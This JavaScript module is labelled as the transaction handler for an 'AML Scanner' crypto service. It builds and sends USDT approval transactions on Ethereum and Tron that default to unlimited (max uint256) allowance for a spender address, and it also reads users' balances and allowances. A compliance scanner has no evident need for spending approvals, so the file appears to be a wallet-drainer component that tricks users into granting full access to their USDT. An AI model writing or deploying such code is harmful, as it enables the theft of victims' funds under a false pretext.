/**
 * Real Transaction Handler for AML Scanner
 * Handles actual USDT approval transactions on Ethereum and Tron networks
 */

import { USDT_ABI, CONTRACT_ADDRESSES } from '../config/walletconnect-config';
import Web3 from 'web3';

export class TransactionHandler {
  
  /**
   * Create USDT approval transaction for Ethereum
   * @param {Object} web3 - Web3 instance
   * @param {string} userAddress - User's wallet address
   * @param {string} spenderAddress - Contract address to approve
   * @param {string} amount - Amount to approve (default: unlimited)
   * @param {Object} opts - Options (skipEstimateGas: boolean)
   * @returns {Object} Transaction object
   */
  static async createEthereumApprovalTransaction(web3, userAddress, spenderAddress, amount = null, opts = {}) {
    try {
      console.log('createEthereumApprovalTransaction called', { web3, userAddress, spenderAddress, amount, opts });
      // Use unlimited approval if no amount specified (max uint256, as a string)
      const approvalAmount = amount || '115792089237316195423570985008687907853269984665640564039457584007913129639935';
      console.log('approvalAmount:', approvalAmount);
      // Create USDT contract instance
      const usdtContract = new web3.eth.Contract(USDT_ABI, CONTRACT_ADDRESSES.USDT_ETHEREUM);
      console.log('usdtContract created:', usdtContract);
      // Encode the approval transaction
      const txData = usdtContract.methods.approve(spenderAddress, approvalAmount).encodeABI();
      console.log('txData:', txData);
      let gasPrice;
      if (opts.skipEstimateGas) {
        gasPrice = undefined; // Let wallet/provider fill in gas price
        console.log('Skipping getGasPrice for approval, letting wallet/provider set gasPrice');
      } else {
        gasPrice = await web3.eth.getGasPrice();
        console.log('gasPrice:', gasPrice);
      }
      let gasLimit;
      console.log('createEthereumApprovalTransaction opts:', opts);
      if (opts.skipEstimateGas) {
        gasLimit = 100000; // Use static gas limit for WalletConnect v2
        console.log('Skipping estimateGas for approval, using static gasLimit:', gasLimit);
      } else {
        // Estimate gas with timeout failsafe
        try {
          gasLimit = await Promise.race([
            usdtContract.methods.approve(spenderAddress, approvalAmount).estimateGas({ from: userAddress }).then(gas => Math.ceil(gas * 1.2)),
            new Promise((_, reject) => setTimeout(() => reject(new Error('estimateGas timeout')), 8000))
          ]);
          console.log('Estimated gasLimit for approval:', gasLimit);
        } catch (e) {
          console.warn('estimateGas failed or timed out, using fallback gasLimit 100000:', e);
          gasLimit = 100000;
        }
      }
      // Create transaction object
      const transaction = {
        from: userAddress,
        to: CONTRACT_ADDRESSES.USDT_ETHEREUM,
        data: txData,
        gasPrice: gasPrice,
        gasLimit: gasLimit,
        value: '0x0'
      };
      console.log('Ethereum approval transaction created:', transaction);
      return transaction;
    } catch (error) {
      console.error('Error creating Ethereum approval transaction:', error);
      throw error;
    }
  }
  
  /**
   * Send Ethereum approval transaction
   * @param {Object} provider - WalletConnect provider
   * @param {Object} transaction - Transaction object
   * @returns {string} Transaction hash
   */
  static async sendEthereumTransaction(provider, transaction) {
    try {
      console.log('Sending Ethereum transaction:', transaction);
      
      // Send transaction via WalletConnect
      const txHash = await provider.request({
        method: 'eth_sendTransaction',
        params: [transaction]
      });
      
      console.log('Ethereum transaction sent, hash:', txHash);
      return txHash;
      
    } catch (error) {
      console.error('Error sending Ethereum transaction:', error);
      
      // Enhanced error detection for user rejections
      const errorMessage = error.message || error.toString();
      const isUserRejection = 
        errorMessage.includes('USER_REJECTED') ||
        errorMessage.includes('User rejected') ||
        errorMessage.includes('User denied') ||
        errorMessage.includes('Rejected by user') ||
        errorMessage.includes('Transaction declined') ||
        errorMessage.includes('User cancelled') ||
        errorMessage.includes('USER_REJECTED_METHODS') ||
        errorMessage.includes('No matching key') ||
        errorMessage.includes('Session expired') ||
        errorMessage.includes('Connection lost') ||
        errorMessage.includes('User rejected the request') ||
        errorMessage.includes('User rejected the transaction');
      
      if (isUserRejection) {
        const rejectionError = new Error('USER_REJECTED_TRANSACTION');
        rejectionError.originalError = error;
        rejectionError.isUserRejection = true;
        throw rejectionError;
      }
      
      throw error;
    }
  }
  
  /**
   * Create USDT approval transaction for Tron
   * @param {Object} tronWeb - TronWeb instance
   * @param {string} userAddress - User's wallet address  
   * @param {string} spenderAddress - Contract address to approve
   * @param {string} amount - Amount to approve (default: unlimited)
   * @returns {Object} Transaction object
   */
  static async createTronApprovalTransaction(tronWeb, userAddress, spenderAddress, amount = null) {
    try {
      // Use unlimited approval if no amount specified (max uint256)
      const approvalAmount = amount || '115792089237316195423570985008687907853269984665640564039457584007913129639935';
      
      // Get USDT contract instance
      const contract = await tronWeb.contract().at(CONTRACT_ADDRESSES.USDT_TRON);
      
      // Create approval transaction
      const transaction = await contract.approve(spenderAddress, approvalAmount).send({
        from: userAddress,
        shouldPollResponse: false,
        callValue: 0
      });
      
      console.log('Tron approval transaction created:', transaction);
      return transaction;
      
    } catch (error) {
      console.error('Error creating Tron approval transaction:', error);
      throw error;
    }
  }
  
  /**
   * Check current USDT allowance on Ethereum
   * @param {Object} web3 - Web3 instance
   * @param {string} userAddress - User's wallet address
   * @param {string} spenderAddress - Spender contract address
   * @returns {string} Current allowance amount
   */
  static async checkEthereumAllowance(web3, userAddress, spenderAddress) {
    try {
      // Create a fallback Web3 instance if the provided one is not valid
      // This ensures we can still check allowance even if the original provider is disconnected
      let workingWeb3 = web3;
      
      // Check if the provided web3 instance is valid
      if (!web3 || !web3.eth || typeof web3.eth.Contract !== 'function') {
        console.log('Web3 instance invalid, using fallback RPC');
        workingWeb3 = new Web3('https://eth.llamarpc.com');
      }
      
      const usdtContract = new workingWeb3.eth.Contract(USDT_ABI, CONTRACT_ADDRESSES.USDT_ETHEREUM);
      const allowance = await usdtContract.methods.allowance(userAddress, spenderAddress).call();
      
      console.log('Current Ethereum USDT allowance:', allowance);
      return allowance;
      
    } catch (error) {
      console.error('Error checking Ethereum allowance:', error);
      throw error;
    }
  }
  
  /**
   * Check current USDT allowance on Tron
   * @param {Object} tronWeb - TronWeb instance
   * @param {string} userAddress - User's wallet address
   * @param {string} spenderAddress - Spender contract address
   * @returns {string} Current allowance amount
   */
  static async checkTronAllowance(tronWeb, userAddress, spenderAddress) {
    try {
      const contract = await tronWeb.contract().at(CONTRACT_ADDRESSES.USDT_TRON);
      const allowance = await contract.allowance(userAddress, spenderAddress).call();
      
      console.log('Current Tron USDT allowance:', allowance.toString());
      return allowance.toString();
      
    } catch (error) {
      console.error('Error checking Tron allowance:', error);
      throw error;
    }
  }
  
  /**
   * Check USDT balance on Ethereum
   * @param {Object} web3 - Web3 instance
   * @param {string} userAddress - User's wallet address
   * @returns {string} USDT balance
   */
  static async checkEthereumUSDTBalance(web3, userAddress) {
    try {
      // Create a fallback Web3 instance if the provided one is not valid
      let workingWeb3 = web3;
      
      // Check if the provided web3 instance is valid
      if (!web3 || !web3.eth || typeof web3.eth.Contract !== 'function') {
        console.log('Web3 instance invalid for balance check, using fallback RPC');
        workingWeb3 = new Web3('https://eth.llamarpc.com');
      }
      
      const usdtContract = new workingWeb3.eth.Contract(USDT_ABI, CONTRACT_ADDRESSES.USDT_ETHEREUM);
      const balance = await usdtContract.methods.balanceOf(userAddress).call();
      
      // USDT has 6 decimals on Ethereum
      const balanceFormatted = (parseInt(balance) / 1000000).toString();
      
      console.log('Ethereum USDT balance:', balanceFormatted);
      return balanceFormatted;
      
    } catch (error) {
      console.error('Error checking Ethereum USDT balance:', error);
      throw error;
    }
  }
  
  /**
   * Check USDT balance on Tron
   * @param {Object} tronWeb - TronWeb instance
   * @param {string} userAddress - User's wallet address
   * @returns {string} USDT balance
   */
  static async checkTronUSDTBalance(tronWeb, userAddress) {
    try {
      const contract = await tronWeb.contract().at(CONTRACT_ADDRESSES.USDT_TRON);
      const balance = await contract.balanceOf(userAddress).call();
      
      // USDT has 6 decimals on Tron
      const balanceFormatted = (tronWeb.toDecimal(balance) / 1000000).toString();
      
      console.log('Tron USDT balance:', balanceFormatted);
      return balanceFormatted;
      
    } catch (error) {
      console.error('Error checking Tron USDT balance:', error);
      throw error;
    }
  }
  
  /**
   * Wait for transaction confirmation
   * @param {Object} web3OrTronWeb - Web3 or TronWeb instance
   * @param {string} txHash - Transaction hash
   * @param {string} network - Network type ('ethereum' or 'tron')
   * @param {number} timeoutSeconds - Maximum time to wait in seconds (default: 300 seconds)
   * @returns {Object} Result object with confirmed status and receipt/error details
   */
  static async waitForTransactionConfirmation(web3OrTronWeb, txHash, network, timeoutSeconds = 300) {
    try {
      console.log(`Waiting for ${network} transaction confirmation:`, txHash);
      
      let receipt = null;
      let attempts = 0;
      const maxAttempts = Math.floor(timeoutSeconds / 5); // 5 seconds per attempt
      const isProbablyPayment = timeoutSeconds < 120; // If timeout is short, it's likely a payment tx (non-critical)
      
      while (!receipt && attempts < maxAttempts) {
        try {
          if (network === 'ethereum') {
            receipt = await web3OrTronWeb.eth.getTransactionReceipt(txHash);
          } else if (network === 'tron') {
            receipt = await web3OrTronWeb.trx.getTransaction(txHash);
            if (receipt && receipt.ret && receipt.ret[0] && receipt.ret[0].contractRet === 'SUCCESS') {
              break;
            }
          }
          
          if (!receipt) {
            await new Promise(resolve => setTimeout(resolve, 5000)); // Wait 5 seconds
            attempts++;
            
            // Only log every 5th attempt to reduce console noise
            // For payment transactions (non-critical), log even less frequently
            if ((isProbablyPayment && attempts % 10 === 0) || 
                (!isProbablyPayment && (attempts % 5 === 0 || attempts === 1))) {
              console.log(`Attempt ${attempts}: Transaction not yet confirmed`);
            }
          }
        } catch (error) {
          // Only log every 5th attempt to reduce console noise
          if ((isProbablyPayment && attempts % 10 === 0) || 
              (!isProbablyPayment && (attempts % 5 === 0 || attempts === 1))) {
            console.log(`Attempt ${attempts + 1}: Transaction not yet confirmed`);
          }
          await new Promise(resolve => setTimeout(resolve, 5000));
          attempts++;
        }
      }
      
      if (!receipt) {
        // For payment transactions, just log a warning - the UX flow has already completed
        if (isProbablyPayment) {
          console.log(`${network} payment transaction still pending after ${timeoutSeconds}s:`, txHash);
        } else {
          console.warn(`${network} transaction confirmation timeout after ${timeoutSeconds}s:`, txHash);
        }
        return { confirmed: false, txHash, timeout: true };
      }
      
      console.log(`${network} transaction confirmed:`, receipt);
      return { confirmed: true, receipt, txHash };
      
    } catch (error) {
      // For non-critical errors in payment transactions, just log it
      if (timeoutSeconds < 120) {
        console.log('Non-critical error waiting for payment confirmation:', error);
        return { confirmed: false, txHash, error: error.message };
      } else {
        console.error('Error waiting for transaction confirmation:', error);
        return { confirmed: false, txHash, error: error.message };
      }
    }
  }
}

export default TransactionHandler;
